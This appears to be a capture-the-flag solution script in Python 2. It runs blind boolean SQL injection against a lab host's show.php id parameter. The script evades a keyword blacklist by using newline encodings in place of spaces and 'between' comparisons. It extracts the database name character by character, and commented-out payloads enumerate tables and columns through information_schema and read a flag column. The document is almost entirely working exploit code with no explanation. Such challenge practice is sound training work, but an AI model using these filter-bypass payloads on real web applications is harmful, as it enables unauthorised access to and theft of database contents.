'''blacklist-linkedbyx-2018-11
?id=-1 or select database() between 0x20 and 0x7a
'''
import requests

baseurl = 'http://172.16.206.101/show.php?id=-1%0aor%0a'
flag = ''

for i in range(50):
  found = False
  for c in range(0x7e, 0x1f, -1):
    pay = '(select%0adatabase()between%0a0x' + flag + hex(c)[2:] + '%0aand%0a0x7e)'
    #pay = '(select%0a(select%0agroup_concat(table_name)%0afrom%0ainformation_schema%0a.tables%0awhere%0atable_schema%0abetween%0a0x776562and0x776562)between%0a0x' + flag + hex(c)[2:] + '%0aand%0a0x7e)'
    #pay = '(select%0a(select%0agroup_concat(column_name)%0afrom%0ainformation_schema%0a.columns%0awhere%0atable_name%0abetween%0a0x666c61676767and0x666c61676767)between%0a0x' + flag + hex(c)[2:] + '%0aand%0a0x7e)'
    #pay = '(select%0a(select%0aflagg%0afrom%0aflaggg)between%0a0x' + flag + hex(c)[2:] + '%0aand%0a0x7e)'
    
    url = baseurl + pay
    r = requests.get(url)
    if '10' in r.text:
      found = True
      flag += hex(c)[2:]
      print flag
      break
  if not found:
    break
print flag.decode('hex')